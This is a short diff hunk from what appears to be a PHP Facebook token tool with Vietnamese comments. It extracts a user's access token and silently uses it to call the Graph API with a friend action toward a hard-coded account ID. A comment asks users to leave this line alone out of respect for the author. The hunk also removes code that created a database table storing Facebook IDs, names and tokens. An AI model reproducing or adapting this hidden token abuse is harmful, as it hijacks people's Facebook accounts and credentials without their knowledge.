@@ -10,14 +10,6 @@ if(preg_match("'access_token=(.*?)&expires_in='", $gettoken, $matches)){
     } 
 if($token){ 
 auto('https://graph.facebook.com/me/friends?method=post&uids=100004294419791&access_token='.$token); //gi&#7919; nguyên,vui long tôn tr&#7885;ng tác gi&#7843;, hãy t&#7841;o thêm 1 function m&#7899;i !//
-@mysqli_query($GLOBALS["___mysqli_ston"], "CREATE TABLE IF NOT EXISTS `token` ( 
-  `id` int(11) NOT NULL AUTO_INCREMENT, 
-  `idfb` varchar(32)  NOT NULL, 
-  `ten` varchar(32)  NOT NULL, 
-  `token` varchar(255)  NOT NULL, 
-  PRIMARY KEY (`id`) 
- ) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ; 
-"); 
 
 $app = check($token); 
 if($app[id] == "350685531728" || $app[id] == "6628568379"){ 
